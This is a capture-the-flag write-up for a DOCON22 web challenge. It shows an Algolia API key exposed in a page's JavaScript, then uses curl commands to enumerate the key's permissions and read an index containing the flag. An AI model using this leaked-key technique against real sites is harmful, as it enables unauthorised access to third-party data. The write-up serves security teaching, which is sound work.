# Challenge description

Happy hunting!

https://punk-security.github.io/DOCON22_CTF2/

Author: PunkSecurity
-----------------------------------------------------------

in this page we can see the source code which is a js script 

![image](https://user-images.githubusercontent.com/58823465/166170882-47d38f4f-4af6-4ad7-b588-3957a81cbaf8.png)


So we know it uses the Algolia search engine API

The most interesting line in the code is 

```
searchClient: algoliasearch('SBD4QQONZU', '7086ec0b05107bb2dcc86f177e83c287'),
``` 

which turned out to be the APP_ID and API_KEY for Algolia, from the name of the challenge we can tell we got a "leaked" API_KEY that we can use to find interesting things

Reading throught the docs we find some curl commands we can try, so first off :

``` 
curl "https://SBD4QQONZU-dsn.algolia.net/1/keys/7086ec0b05107bb2dcc86f177e83c287?x-algolia-application-id=SBD4QQONZU&x-algolia-api-key=7086ec0b05107bb2dcc86f177e83c287"
```

Output :

```json
{
    "value": "7086ec0b05107bb2dcc86f177e83c287",
    "createdAt": 1651305758,
    "acl": ["search", "listIndexes"],
    "validity": 0,
    "indexes": ["punk_PUBLIC_INDEX", "punk_DOCON22"],
    "description": "DOCON22_CTF"
}
``` 

Algolia works with ACLs and Indexes and we can see we have some indexes and an ACL which can "listIndexes" and do a "search".

Using this curl command we can use the ListIndexes ACL

```
curl -X GET "https://SBD4QQONZU-dsn.algolia.net/1/indexes/punk_DOCON22?x-algolia-application-id=SBD4QQONZU&x-algolia-api-key=7086ec0b05107bb2dcc86f177e83c287"
```
Output

```json
{
    "hits": [{
        "flag": "DOCTF{pr0t3ct_th0s3_k3ys}",
        "objectID": "247439083e601_dashboard_generated_id",
        "_highlightResult": {
            "flag": {
                "value": "DOCTF{pr0t3ct_th0s3_k3ys}",
                "matchLevel": "none",
                "matchedWords": []
            }
        }
    }],
    "nbHits": 1,
    "page": 0,
    "nbPages": 1,
    "hitsPerPage": 20,
    "exhaustiveNbHits": true,
    "exhaustiveTypo": true,
    "query": "",
    "params": "x-algolia-application-id=SBD4QQONZU&x-algolia-api-key=7086ec0b05107bb2dcc86f177e83c287",
    "renderingContent": {},
    "processingTimeMS": 1
}
```

And there's our flag


``` Flag : DOCTF{pr0t3ct_th0s3_k3ys} ```

```
